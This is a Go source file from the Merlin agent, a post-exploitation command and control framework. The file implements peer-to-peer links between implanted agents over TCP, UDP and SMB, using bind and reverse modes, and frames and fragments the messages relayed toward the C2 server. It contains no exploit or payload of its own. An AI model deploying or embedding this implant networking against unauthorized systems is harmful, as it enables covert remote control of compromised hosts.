// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

// Package p2p is used for Agent based peer-to-peer communications
package p2p

import (
	// Standard
	"encoding/binary"
	"fmt"
	"math"
	"net"
	"sync"
	"time"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/messages"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
)

// Types of Peer-to-peer Agents
const (
	TCPBIND    = 0
	TCPREVERSE = 1
	UDPBIND    = 2
	UDPREVERSE = 3
	SMBBIND    = 4
)

const (
	// MaxSizeUDP is the maximum size of a UDP fragment
	// http://ithare.com/udp-from-mog-perspective/
	MaxSizeUDP = 1450
)

// LinkedAgents is a map that holds information about peer-to-peer connected agents for receiving & routing messages
var LinkedAgents = sync.Map{}

// out a global map of Delegate messages that are outgoing from this Agent to its parent or the server
var out = make(chan messages.Delegate, 100)

// Agent holds information about peer-to-peer linked agents
type Agent struct {
	In     chan messages.Base // In a channel of incoming Base messages coming in from the linked Agent
	Out    chan messages.Base // Out a channel of outgoing Base messages to be sent to the linked Agent
	Conn   interface{}        // Conn the network connection used to communicate with the linked Agent
	Type   int                // Type of the linked Agent (e.g., tcp-bind, SMB, etc.)
	Remote net.Addr           // Remote is the name or address of the remote Agent data is being sent to
}

// GetDelegateMessages infinitely loops through the global Delegate message channel and return a list of them
func GetDelegateMessages() (messages []messages.Delegate) {
	// Check the output channel
	for {
		if len(out) > 0 {
			msg := <-out
			messages = append(messages, msg)
		} else {
			break
		}
	}
	return
}

// AddDelegateMessage places an incoming Delegate message into the global out channel
func AddDelegateMessage(msg messages.Delegate) {
	// Convert to Job and add it to the queue
	out <- msg
}

// HandleDelegateMessages takes in a list of incoming Delegate messages to this parent Agent and sends it to the child or linked Agent
func HandleDelegateMessages(delegates []messages.Delegate) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/p2p.HandleDelegateMessages(): received %d delegate messages", len(delegates)))

	for _, delegate := range delegates {
		agent, ok := LinkedAgents.Load(delegate.Agent)
		if !ok {
			cli.Message(cli.WARN, fmt.Sprintf("%s is not a known linked agent\n", delegate.Agent))
			break
		}

		// Tag/Type, Length, Value (TLV)
		// Determine the message type, which is static right now
		// uint is 32-bits (4 bytes)
		tag := make([]byte, 4)
		binary.BigEndian.PutUint32(tag, uint32(1))
		// Going for uint64 (8 bytes)
		length := make([]byte, 8)
		binary.BigEndian.PutUint64(length, uint64(len(delegate.Payload)))
		// Prepend the data length
		delegate.Payload = append(length, delegate.Payload...)
		// Prepend the data type/tag
		delegate.Payload = append(tag, delegate.Payload...)

		var n int
		var err error
		switch agent.(Agent).Type {
		case TCPBIND, TCPREVERSE, SMBBIND:
			n, err = agent.(Agent).Conn.(net.Conn).Write(delegate.Payload)
			cli.Message(cli.DEBUG, fmt.Sprintf("clients/p2p.HandleDelegateMessages(): Wrote %d bytes to the linked agent %s at %s at %s\n", n, delegate.Agent, agent.(Agent).Remote, time.Now().UTC().Format(time.RFC3339)))
		case UDPBIND, UDPREVERSE:
			// Split into fragments of MaxSize
			fragments := int(math.Ceil(float64(len(delegate.Payload)) / float64(MaxSizeUDP)))
			cli.Message(cli.DEBUG, fmt.Sprintf("clients/p2p.HandleDelegateMessages(): UDP data size is: %d, max UDP fragment size is %d, creating %d fragements", len(delegate.Payload), MaxSizeUDP, fragments))
			var i int
			size := len(delegate.Payload)
			for i < fragments {
				start := i * MaxSizeUDP
				var stop int
				// if bytes remaining are less than max size, read until the end
				if size < MaxSizeUDP {
					stop = len(delegate.Payload)
				} else {
					stop = (i + 1) * MaxSizeUDP
				}
				switch agent.(Agent).Type {
				case UDPBIND:
					n, err = agent.(Agent).Conn.(net.Conn).Write(delegate.Payload[start:stop])
				case UDPREVERSE:
					n, err = agent.(Agent).Conn.(net.PacketConn).WriteTo(delegate.Payload[start:stop], agent.(Agent).Remote)
				}
				if err != nil {
					cli.Message(cli.WARN, fmt.Sprintf("clients/p2p.HandleDelegateMessages(): there was an error writing a message to the linked agent %s: %s\n", agent.(Agent).Conn.(net.Conn).RemoteAddr(), err))
					break
				}
				cli.Message(cli.INFO, fmt.Sprintf("clients/p2p.HandleDelegateMessages(): Wrote UDP fragment %d of %d", i+1, fragments))
				i++
				size = size - MaxSizeUDP
			}
		default:
			cli.Message(cli.WARN, fmt.Sprintf("p2p.HandleDelegateMessages(): unhandled Agent type: %d", agent.(Agent).Type))
			break
		}

		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("clients/p2p.HandleDelegateMessages(): there was an error writing a message to the linked agent %s: %s\n", agent.(Agent).Conn.(net.Conn).RemoteAddr(), err))
			break
		}
		cli.Message(cli.NOTE, fmt.Sprintf("Wrote %d bytes to the linked agent %s at %s at %s\n", len(delegate.Payload), delegate.Agent, agent.(Agent).Remote, time.Now().UTC().Format(time.RFC3339)))
		// Without a delay, synchronous connections can send multiple messages so fast that receiver things it is one message
		time.Sleep(time.Millisecond * 30)
	}
}

// Returns the Agent's type as a string
func (a *Agent) String() string {
	switch a.Type {
	case TCPBIND:
		return "tcp-bind"
	case TCPREVERSE:
		return "tcp-reverse"
	case UDPBIND:
		return "udp-bind"
	case UDPREVERSE:
		return "udp-reverse"
	default:
		return fmt.Sprintf("unknown peer-to-peer agent type %d", a.Type)
	}
}
